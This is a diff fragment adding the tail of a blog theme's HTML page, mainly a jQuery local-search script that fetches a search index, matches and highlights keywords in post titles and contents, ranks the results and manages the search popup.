+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
